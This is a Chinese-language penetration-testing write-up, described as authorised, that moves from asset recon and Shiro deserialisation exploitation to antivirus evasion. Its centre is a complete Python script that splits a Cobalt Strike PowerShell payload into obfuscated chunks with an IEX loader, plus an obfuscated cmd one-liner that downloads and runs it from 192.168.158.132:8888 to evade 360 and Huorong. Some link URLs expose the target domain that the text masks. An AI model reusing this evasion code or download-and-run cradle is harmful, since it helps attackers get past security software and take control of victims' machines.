**渗透开始：**

# 1.访问官网获取信息开始渗透

> <https://www.xxx.com.cn/>

![1637115541_619466956adee1bb30876.png!small](https://image.3001.net/images/20211117/1637115541_619466956adee1bb30876.png!small)

可以使用Fofa，火线，zoomeye，searchcode.com等爬取相关的资产，重点关注一些有漏洞暴露的框架和服务例如：泛微，PHP，Tomca，后台，weblogic等等。之后就主要分三步：
**指纹识别、漏洞验证、漏洞复现。**

指纹识别很好理解，我们要拿历史漏洞怼它，首先要知道，它是什么有什么漏洞，不然你这怼半天，没有怼到点上，还容易被404警告（根据相关的指纹识别wappalyzer，云悉，Ehole，自建指纹库等等）。

https://github.com/EdgeSecurityTeam/EHole

> <https://zone.huoxian.cn/>
>
> <https://searchcode.com/>

![1637115847_619467c7198c39bfbf51b.png!small](https://image.3001.net/images/20211117/1637115847_619467c7198c39bfbf51b.png!small)

![1637115880_619467e8270524930998a.png!small](https://image.3001.net/images/20211117/1637115880_619467e8270524930998a.png!small)

同时按需求和习惯把旗下50%以上控股的公司进行收集根域--到子域收集（layer，oneforall等等）https://github.com/shmilylty/OneForAll

# 2.综合渗透分析脑图：

分享一个很细的工具集。![](https://image.3001.net/images/20211117/1637116057_61946899953acbee83f24.png!small)

初步收集到大量资产识别某个目标是某个系统之后，需要针对该系统收集其历史漏洞情况，然后进行漏洞验证。所以漏洞验证部分需要两步，漏洞梳理和漏洞验证，漏洞梳理主要是从公开资料去收集目标系统相关的历史漏洞。

网络上有很多资料，比如 xxx 文库，github，还有免费开源的工具和 POC，比如 xray、nuclei，提供了很多漏洞验证的
POC，还有付费写的软件和平台；漏洞验证部分，尽量做到无害验证例如：挑个软的泛微云桥公开POC验证。![](https://image.3001.net/images/20211117/1637117210_61946d1a206fee236ee65.png!small)

发现没有漏洞，就换个资产继续，渗透都是一步步来的。发现第一个漏洞——信息泄露，是一个好的开始，找到些配置信息仔细先记录下来，继续一步步扩大成果。

>
> [http://www.xxxxxx.com/.idea/workspace.xml](http://www.greenlandky.com/.idea/workspace.xml)
>
> <http://www.xxxxxx.com/.idea/modules.xml>

![](https://image.3001.net/images/20211117/1637117676_61946eec200b2d38077ca.png!small)

![](https://image.3001.net/images/20211117/1637117690_61946efa5ea6135654193.png!small)

本着 **以洞打洞原则** ：有一个漏洞必定有下一个漏洞进行这个域名更深的渗透--反查IP发现无CDN是真实IP直接全端口探测，（这里用的goby，全端口用nmap低速SYN扫描方式效果最好）。![](https://image.3001.net/images/20211117/1637117775_61946f4f597b5a20c4885.png!small)

![](https://image.3001.net/images/20211117/1637117798_61946f665ef2ee1a0ab8e.png!small)

去测试9090端口爆破没有结果，js，目录探测，右键源码等无结果继续换端口渗透。![1637117927_61946fe783ffa730d7370.png!small](https://image.3001.net/images/20211117/1637117927_61946fe783ffa730d7370.png!small)

换到8088端口跳转网站继续进行渗透。![](https://image.3001.net/images/20211117/1637118011_6194703b5f3df7b6911e9.png!small)

跳转到[http://xx.xxxxxx.com:8010/login](http://ac.greenlandky.com:8010/login)继续抓包爆破发现shiro的特征rememberMe直接去验证：

Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，在它编号为 550 的 issue 中爆出严重的 Java
反序列化漏洞。为了让浏览器或服务器重启后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存在 Cookie 的 rememberMe
字段中，下次读取时进行解密再反序列化。

但是在 Shiro 1.2.4 版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的 rememberMe
Cookie，进而触发反序列化漏洞。

Payload产生的过程：  
命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie值。  
在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。![](https://image.3001.net/images/20211117/1637118126_619470aeab212bbde23f1.png!small)

验证成功Windows单网卡并且出网。![](https://image.3001.net/images/20211117/1637118239_6194711f1425ed3068618.png!small)注意ping命令控制数量防止死ping。![](https://image.3001.net/images/20211117/1637118272_6194714040878db28950a.png!small)

发现360需要免杀绕过。![1637118336_61947180eec5ca54f7783.png!small](https://image.3001.net/images/20211117/1637118336_61947180eec5ca54f7783.png!small)

# 3.分离免杀：

杀毒软件的原理是根据特征、行为、基于云查杀，云查杀主要是根据特征码进行查杀，每一种杀毒软件都会检测头文件，所以可以进行程序段代码分离的形式，绕过当前主流杀软。

自己搭建一个Cobalt
Strike运行客户端后选powershell脚本。![1637118351_6194718fbf7250f2423fd.png!small](https://image.3001.net/images/20211117/1637118351_6194718fbf7250f2423fd.png!small)

去挂载在公网。![1637118374_619471a641965d8176977.png!small](https://image.3001.net/images/20211117/1637118374_619471a641965d8176977.png!small)

混淆方法

首先将FromBase64String改成FromBase65String。

> $string = ''  
> $s = [Byte[]]$var_code = [System.Convert]::FromBase64String("")  
> $s |foreach { $string = $string + $_.ToString()+','}  
> $string > c:\1.txt

将生成的编码分成两块或者多块再组合。

> [Byte[]]$var_c1 = [Byte[]](FromBase65String的代码)  
> [Byte[]]$var_c2 = [Byte[]](FromBase65String的代码)  
> $var_code=$var_c1+$var_c2  
> $s=New-Object IO.MemoryStream(,$var_code);IEX (New-Object
> IO.StreamReader(New-Object
> IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

完整脚本。

> import requests
>
> import re
>
> import sys
>
> import threading
>
> import os
>
> import platform
>
> import subprocess
>
> import base64
>
> def getkey(url):
>
> url=url
>
> r = requests.get(url).text
>
> key=re.findall(r'FromBase64String\\(\"(.*)\"',r)
>
> str1 = ''.join(key)
>
> return str1
>
> def get_bypass_txt(key):
>
> file=open("keyword.txt",'w')
>
> file.write(key)
>
> file.close()
>
>
> #os.system("C:\\\Windows\\\System32\\\WindowsPowerShell\\\v1.0\\\powershell.exe
> $string = '';$s = [Byte[]]$var_code =
> [System.Convert]::FromBase64String((Get-Content keyword.txt));$s | foreach {
> $string = $string + $_.ToString()+','};$string > keyword2.txt")
>
> with open("keyword.txt", "rb") as f:
>
> data = f.read()
>
> d = base64.b64decode(data)
>
> with open("bypass.txt", "w+") as fw:
>
> for x in d:
>
> fw.write(str(x) + ",")
>
> if __name__ == '__main__':
>
> j=1
>
> k=0
>
> url=input("输入cs文件地址：")
>
> key=getkey(url)
>
> get_bypass_txt(key)
>
> with open('bypass.txt', 'r') as f1:
>
> results = f1.read()
>
> str=results.split(',')
>
> k=int(len(str))
>
> chunk=int(input("请输入需要分的块数："))
>
> sum_chunk=k//chunk
>
> for i in range(0,chunk):
>
> #print(i+1)
>
> if i==0:
>
> new_str=str[0:sum_chunk]
>
> s=",".join(new_str)
>
> #print(s)
>
> with open('poershell_bypass.txt','w') as f:
>
> f.write("[Byte[]]$var_c%d = [Byte[]](%s)\n"% (j,s))
>
> j+=1
>
> # print(new_str)
>
> elif i+1<chunk:
>
> new_str[i]=str[sum_chunk*i:sum_chunk*(i+1)]
>
> #print(new_str[i])
>
> s = ",".join(new_str[i])
>
> # print(s)
>
> with open('poershell_bypass.txt', 'a+') as f:
>
> f.write("[Byte[]]$var_c%d = [Byte[]](%s)\n"% (j, s))
>
> j += 1
>
> elif i+1==chunk:
>
> new_str[i]=str[sum_chunk*i:]
>
> s = ",".join(new_str[i][:-1])
>
> # print(s)
>
> with open('poershell_bypass.txt', 'a+') as f:
>
> f.write("[Byte[]]$var_c%d = [Byte[]](%s)\n" % (j, s))
>
> j += 1
>
> for i in range(int(chunk)):
>
> if i==0:
>
> with open('poershell_bypass.txt', 'a+') as f:
>
> f.write("$var_code=$var_c%d"%(i+1))
>
> elif i<chunk-1:
>
> with open('poershell_bypass.txt', 'a+') as f:
>
> f.write("+$var_c%d" % (i + 1))
>
> elif i ==chunk - 1:
>
> with open('poershell_bypass.txt', 'a+') as f:
>
> f.write("+$var_c%d \n$s=New-Object IO.MemoryStream(,$var_code);$a1='IEX
> (New-Object IO.Strea123'.Replace('123','mRe');$a2='ader(New-Object
> IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()';IEX($A1+$a2)"
> % (i + 1))
>
> print("poershell_bypass.txt已经生成完成！")

进行分离。![1637118557_6194725d80ce6d8b01214.png!small](https://image.3001.net/images/20211117/1637118557_6194725d80ce6d8b01214.png!small)

继续挂载在CS服务器上远程下载。![1637118570_6194726aae5223ca4f851.png!small](https://image.3001.net/images/20211117/1637118570_6194726aae5223ca4f851.png!small)

由于360和火绒对powershell命令会禁止调用，我们需要绕过360和火绒的禁止。

> set aa=powers&& set bb=hell && cmd /c "echo set-alias -name test -value
> IEX;test(New-Object
> NeT."W`ebC`li`ent")."D`own`l`oadStr`ing"('ht'+'tP://192'+'.168.158.132:8888'+'/poershell_bypass.txt')
> | %aa%%bb% -"

![1637118609_619472910b354ac756368.png!small](https://image.3001.net/images/20211117/1637118609_619472910b354ac756368.png!small)

![](https://image.3001.net/images/20211117/1637118678_619472d678a350ce5250c.png!small)

这个点就到这。

继续把最后的一个端口测试完发现扫描有.DS_Store文件泄露http://43.2xx.xx.155:8012/.DS_Store，github上找个公开脚本进行枚举细心审计会发现更多问题。![](https://image.3001.net/images/20211117/1637118744_619473180290bc23476e5.png!small)

这个ip这么多问题其他子域同样来一波果真这个段还有不少问题又找到两个弱口令。![](https://image.3001.net/images/20211117/1637118801_619473519646587738f65.png!small)

![](https://image.3001.net/images/20211117/1637118866_619473929a1fdb5e983b5.png!small)

# 4\. 总结：

基于一次授权的渗透把一些思路整理一下，本次的重点在以洞打洞原则发现一个小洞顺藤摸瓜发现更多的高危甚至严重问题，像我们日常渗透有这样一步步思路进行收获都不小，当然了运气可以省很大部分时间和心思，一步到位的欧皇也是存在。

 **参考来源：**

> http://www.fndxkl.xyz/2021/07/03/Untitled/

